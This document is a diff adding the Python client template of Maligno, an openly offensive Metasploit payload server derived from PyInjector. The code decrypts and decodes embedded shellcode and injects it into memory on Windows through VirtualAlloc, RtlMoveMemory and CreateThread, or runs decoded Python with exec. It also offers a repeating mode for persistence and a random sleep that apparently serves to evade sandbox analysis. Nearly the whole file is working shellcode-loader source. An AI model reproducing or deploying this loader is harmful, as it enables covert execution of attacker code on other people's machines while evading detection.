@@ -1,0 +1,112 @@
+################################################################
+#                                                              #
+# Maligno - A Metasploit payload server                        #
+# The client template is a modified version of PyInjector      #
+# written by Juan J. Guelfo @ Encripto AS                      #
+# post@encripto.no                                             #
+#                                                              #
+# Copyright 2013-2016 Encripto AS. All rights reserved.        #
+#                                                              #
+# Maligno is licensed under the FreeBSD license.               #
+# http://www.freebsd.org/copyright/freebsd-license.html        #
+#                                                              #
+################################################################
+#                                                              #
+# Original work and credit:                                    #
+#                                                              #
+# PyInjector Written by Dave Kennedy (ReL1K) @ TrustedSec.com  #
+# Injects shellcode into memory through Python and ctypes      #
+#                                                              #
+# Initial awesome code and credit found here:                  #
+# http://www.debasish.in/2012_04_01_archive.html               #
+#                                                              #
+################################################################
+
+import ctypes, base64, sys
+from Crypto.Cipher import AES
+from time import sleep
+from random import randint
+
+__version__ = "2.4"
+
+<CONFIG>
+cfg_cipher = AES.new(cfg_secret)
+cfg_total = 0
+cfg_has_slept = False
+cfg_nap_time = randint(0, cfg_max_nap_time)
+
+
+def prepare_shellcode_injection(psi_shellcode, psi_perpetual_payload, psi_payload_type):
+    if psi_perpetual_payload:
+        while(1):
+            inject_payload(psi_shellcode, psi_payload_type)
+            sleep(30)
+    else:
+        inject_payload(psi_shellcode, psi_payload_type)
+
+
+def inject_payload(ip_shellcode, ip_payload_type):
+    if ip_payload_type == 0:
+        exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]](ip_shellcode))) in globals(), locals()
+
+    elif ip_payload_type == 1:
+        ip_shellcode = ip_shellcode.decode("string_escape")
+        ip_shellcode = bytearray(ip_shellcode)
+        ip_ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(ip_shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
+        ctypes.windll.kernel32.VirtualLock(ctypes.c_int(ip_ptr), ctypes.c_int(len(ip_shellcode)))
+        ip_bff = (ctypes.c_char * len(ip_shellcode)).from_buffer(ip_shellcode)
+        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ip_ptr), ip_bff, ctypes.c_int(len(ip_shellcode)))
+        ip_thread = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ip_ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
+        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ip_thread),ctypes.c_int(-1))
+
+
+def unpack_data(ud_ctext, ud_cipher, ud_encoding_method, ud_encoding_rounds, ud_resp_prefix, ud_resp_suffix):
+    try:
+        if len(ud_resp_prefix) > 0:
+            ud_ctext = ud_ctext.replace(ud_resp_prefix, "")
+
+        if len(ud_resp_suffix) > 0:
+            ud_ctext = ud_ctext.replace(ud_resp_suffix, "")
+
+        if ud_encoding_method.upper() in ["BASE64"]:
+            for ud_i in range(0, ud_encoding_rounds):
+                ud_ctext = base64.b64decode(ud_ctext)
+
+        elif ud_encoding_method.upper() in ["HEX"]:
+            for ud_i in range(0, ud_encoding_rounds):
+                ud_ctext = ud_ctext.decode("hex")
+
+        elif ud_encoding_method.upper() in ["BIN"]:
+            ud_ctext = ud_ctext
+
+        else:
+            for ud_i in range(0, ud_encoding_rounds):
+                ud_ctext = base64.b64decode(ud_ctext)
+
+        ud_plaintext = ud_cipher.decrypt(ud_ctext).split(":")
+        ud_padding_char = ud_plaintext[2]
+        ud_shellcode = ud_plaintext[0].rstrip(ud_padding_char)
+    except:
+        sys.exit(0)
+
+    return ud_shellcode
+
+
+if __name__ == '__main__':
+    if cfg_nap_time <= 0:
+        cfg_nap_time = 1
+
+    for m_iteration in xrange(0, cfg_nap_time):
+        sleep(1)
+        cfg_total += m_iteration
+        if cfg_total == sum(xrange(0, cfg_nap_time)):
+            cfg_has_slept = True
+
+    if cfg_has_slept:
+        <CTEXT>
+        try:
+            m_shellcode = unpack_data(m_ctext, cfg_cipher, cfg_encoding_method, cfg_encoding_rounds, cfg_resp_prefix, cfg_resp_suffix)
+            if m_shellcode:
+                prepare_shellcode_injection(m_shellcode, cfg_perpetual_payload, cfg_payload_type)
+        except:
+            sys.exit(0)
